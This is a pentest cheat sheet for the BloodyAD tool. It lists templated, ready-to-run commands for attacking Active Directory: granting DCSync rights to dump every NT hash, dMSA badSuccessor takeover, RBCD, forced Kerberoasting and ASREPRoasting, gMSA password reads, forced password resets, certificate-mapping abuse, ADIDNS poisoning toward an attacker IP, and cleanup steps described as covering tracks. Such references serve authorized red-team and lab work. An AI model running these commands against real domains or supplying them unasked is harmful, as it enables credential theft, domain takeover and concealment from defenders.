# BloodyAD

<!-- cheat
export bloody_auth
var auth_method = printf 'hash\tUse NT hash\npassword\tUse password\nkerberos\tUse Kerberos ticket\n' --- --delimiter '\t' --map "cut -f1" --heaader "Select Auth Method"

if $auth_method != kerberos
var credential = --- --header "Credential"
fi

if $auth_method == hash
var auth_flags := -p :$credential
fi

if $auth_method == password
var auth_flags := -p $credential
fi

if $auth_method == kerberos
var auth_flags := -k
fi
-->

### badSuccessor

Exploit the badSuccessor primitive to take over the target via dMSA migration abuse. Pass the computer name **without** a trailing `$` - BloodyAD appends it internally and doubling it breaks the attack.

```sh title:"dMSA migration takeover, omit the trailing dollar sign"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add badSuccessor $rhost_name
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rhost_name
-->

### DCSync right

Grant the target user DS-Replication-Get-Changes and Get-Changes-All on the domain root so they can DCSync and dump every NT hash.

```sh title:"Grant Get-Changes + Get-Changes-All on domain root"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dcsync $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### SPN on user

Write a servicePrincipalName onto a user account to make it Kerberoastable on demand (targeted Kerberoasting when you already control the user).

```sh title:"Make target Kerberoastable by writing an SPN"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add spn $target_user $spn_value
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var spn_value
-->

### WriteDacl right

Grant WRITE_DACL on a target DN - lets the grantee rewrite the object's ACL later (classic privesc staging step).

```sh title:"Grant WRITE_DACL on DN for later ACL takeover"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add writeDacl $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### GenericWrite right

Grant GenericWrite on the target DN - enough to add an SPN or shadow credentials without full GenericAll.

```sh title:"Enough for SPN write or shadow creds without full control"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericWrite $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### Group member

Add a user to a group. Most common use: adding yourself to a privileged group after chaining writeMember/genericAll.

```sh title:"groupMember adds principal to group"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add groupMember $group_name $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var group_name
var target_user
-->

### GenericAll right

Grant GenericAll on the DN - full control, including reset password, add members, and rewrite ACLs.

```sh title:"Full control, reset password, add members, rewrite ACL"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add genericAll $DN $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var DN
var target_user
-->

### Trusted for auth delegation

Set the UAC `TRUSTED_TO_AUTH_FOR_DELEGATION` flag - required for S4U2Self abuse (constrained delegation with protocol transition).

```sh title:"UAC flag required for S4U2Self / protocol transition"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f TRUSTED_TO_AUTH_FOR_DELEGATION
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### Disable pre-auth

Set `DONT_REQ_PREAUTH` on the target so it becomes ASREPRoastable on the next request.

```sh title:"Set DONT_REQ_PREAUTH to make target ASREPRoastable"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add uac $target_user -f DONT_REQ_PREAUTH
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->

### RBCD

Configure Resource-Based Constrained Delegation: `delegate_from` (attacker-controlled computer) can impersonate any user to `delegate_to`.

```sh title:"delegate_from can impersonate any user to delegate_to"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add rbcd '$delegate_to' '$delegate_from'
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var delegate_to
var delegate_from
-->

### New computer account

Create a computer account (if MachineAccountQuota > 0) - first step for RBCD and Shadow Credentials attacks when you need your own principal.

```sh title:"Needs MachineAccountQuota > 0 for RBCD / shadow creds"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add computer $rhost_name $target_pass
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var rhost_name
var target_pass
-->

### DNS record

Register an ADIDNS record pointing at your attacker IP - useful for WPAD, MITM, or coercion chains.

```sh title:"ADIDNS entry for WPAD / MITM / coercion targets"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags add dnsRecord $record_name $lhost
```
<!-- cheat
import domain_ip
import users
import bloody_auth
import tun_ip
var rhost_name
var record_name
-->

### Trusts

List domain and forest trust relationships - map the attack surface across trust boundaries.

```sh title:"Map inbound/outbound trusts across the forest"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get trusts
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### DNS dump

Dump every ADIDNS record - equivalent to adidnsdump, reveals internal hostnames without port scanning.

```sh title:"Export every ADIDNS record (adidnsdump equivalent)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get dnsDump
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### BloodHound collection

Run BloodHound collection via BloodyAD's built-in collector - alternative when bloodhound-python isn't working.

```sh title:"Built-in collector, fallback when bloodhound-python fails"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get bloodhound
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### RBCD on computer

Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute to see who's already configured for RBCD against the target.

```sh title:"Read msDS-AllowedToActOnBehalfOfOtherIdentity"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get rbcd $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
-->

### Object info

Dump all readable attributes on a user/group/computer - quick way to check UAC flags, group membership, descriptions, and SPNs.

```sh title:"Dump every readable attribute on an object"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### gMSA password

Read the encoded msDS-ManagedPassword blob from a gMSA - BloodyAD decodes automatically unless `--raw` is passed.

```sh title:"Read msDS-ManagedPassword (auto-decoded to NT hash)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### gMSA raw blob

Read the raw msDS-ManagedPassword blob for manual decoding (feed into gMSADumper / custom scripts).

```sh title:"Raw blob for manual decode via gMSADumper"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $target_user --attr msDS-ManagedPassword --raw
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Writable attributes

Find every object whose attributes the current principal can write to - maps immediate privesc paths via ACL abuse.

```sh title:"Map every object you can write to (ACL privesc paths)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get writable --detail
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### Object attribute

Pull one specific attribute from one object - faster than dumping everything when you know what you're after.

```sh title:"Read single attribute from object (targeted lookup)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get object $object --attr $attribute
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var attribute = printf 'msDS-ManagedPassword\nms-DS-MachineAccountQuota\nmember\nmanagedBy\ndescription\nprimaryGroupID\nmemberOf\nmsDS-KeyCredentialLink\nsAMAccountName\nadminCount\nms-Mcs-AdmPwd\nms-Mcs-AdmPwdExpirationTime\ntrustDirection\ntrustType\ntrustAttributes\nnTSecurityDescriptor\nuserPrincipalName\nservicePrincipalName\nuserAccountControl\n'
var rhost_name
var object
-->

### Reset password

Force-reset a target user's password - requires Reset Password extended right or GenericAll.

```sh title:"Force reset, requires Reset Password right or GenericAll"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set password $target_user $target_pass
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
var target_pass
-->

### Change owner

Rewrite the owner of an object to yourself via WriteOwner - gives you implicit WriteDacl and a path to full control.

```sh title:"WriteOwner abuse, take object ownership"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set owner $target_group $user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_group
-->

### UPN rewrite

Rewrite userPrincipalName. Key trick for ESC9/ESC10 certificate template abuse and UPN impersonation attacks.

```sh title:"UPN swap for ESC9/ESC10 certificate abuse"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $old_upn userPrincipalName -v $new_upn
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var old_upn
var new_upn
-->

### Mail attribute

Modify the `mail` attribute - used in some password reset / OAuth flows and phishing staging.

```sh title:"Change mail attribute, password reset / phishing prep"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user mail -v $new_mail
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var new_mail
var target_user
-->

### altSecurityIdentities (ESC14)

Write altSecurityIdentities with an X509 issuer/subject claim for explicit cert mapping (ESC14b weak mapping abuse).

```sh title:"ESC14b explicit X509 mapping via altSecurityIdentities"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user altSecurityIdentities -v '$x509_claim'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var x509_claim
var target_user
-->

### Overwrite SPN

Overwrite (not append) the servicePrincipalName attribute - destructive variant of `add spn`, wipes existing SPNs.

```sh title:"Destructive SPN overwrite (use add spn to append instead)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user servicePrincipalName -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var spn_value
var target_user
-->

### Clear logon hours

Remove the logonHours restriction so the account can auth 24/7 - unblocks scheduled auth for accounts with time windows.

```sh title:"Remove time-window restriction on account authentication"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user logonHours
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Default UAC (512)

Reset userAccountControl to 512 (NORMAL_ACCOUNT) - clears custom flags like DISABLED, DONT_REQ_PREAUTH, TRUSTED_FOR_DELEGATION.

```sh title:"Reset UAC to 512 NORMAL_ACCOUNT, clears custom flags"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user userAccountControl -v 512
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### displayName

Set the displayName attribute - low-stakes edit, useful for confirming write access without breaking anything.

```sh title:"Cheap write to confirm access without side effects"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user displayName -v '$display_name'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var display_name
var target_user
-->

### description

Set the description attribute - another cheap write; admins sometimes store passwords here (worth scanning too).

```sh title:"Write description, admins sometimes stash creds here"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user description -v '$description'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
var description
-->

### Constrained delegation target

Write msDS-AllowedToDelegateTo on a computer - configures classic constrained delegation (S4U2Proxy to listed SPNs).

```sh title:"Write msDS-AllowedToDelegateTo for S4U2Proxy targets"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $rhost_name msDS-AllowedToDelegateTo -v '$spn_value'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
var spn_value
-->

### MachineAccountQuota

Set ms-DS-MachineAccountQuota on the domain root - raises/lowers how many computers users can join (default 10).

```sh title:"Change ms-DS-MachineAccountQuota (default 10)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object MachineAccountQuota -v 10
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
-->

### Enable account

Clear the ACCOUNTDISABLE UAC bit to re-enable a disabled account - often needed after hijacking an old/stale account.

```sh title:"Clear ACCOUNTDISABLE bit to re-enable stale account"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove uac $target_user -f ACCOUNTDISABLE
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var target_user
-->

### Remove from group

Remove a user from a group - cleanup after a membership privesc to cover tracks.

```sh title:"Drop membership, cleanup after privesc"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove groupMember $group_name $target_user
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var group_name
var target_user
-->

### Delete computer

Delete a computer account - usually used to clean up attacker-created machine accounts from RBCD/shadow-creds setup.

```sh title:"Clean up attacker-created computer account"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove computer $rhost_name
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var rhost_name
-->

### Remove RBCD

Strip an entry from msDS-AllowedToActOnBehalfOfOtherIdentity - undo an RBCD takeover after you're done.

```sh title:"Undo AllowedToActOnBehalfOfOtherIdentity entry"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove rbcd '$delegate_to' '$delegate_from'
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var delegate_to
var delegate_from
-->

### Remove SPN

Remove a single SPN from a user - targeted cleanup after a forced-Kerberoast operation.

```sh title:"Targeted cleanup after forced Kerberoast"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags remove servicePrincipalName $target_user $spn_value
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
var rhost_name
var spn_value
var target_user
-->

### Custom LDAP filter

Run an arbitrary LDAP filter - for queries the canned subcommands don't cover.

```sh title:"Run raw LDAP filter when subcommands don't fit"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search --filter "$ldap_query"
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
import ldap_query
var rhost_name
-->

### Tombstoned search

Include tombstoned (deleted) objects in the search via LDAP show-deleted + show-recycled controls.

```sh title:"Include deleted objects via show-deleted + show-recycled OIDs"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065
```
<!-- cheat
import domain_ip
import users
import passwords
import bloody_auth
import ldap_query
var rhost_name
-->
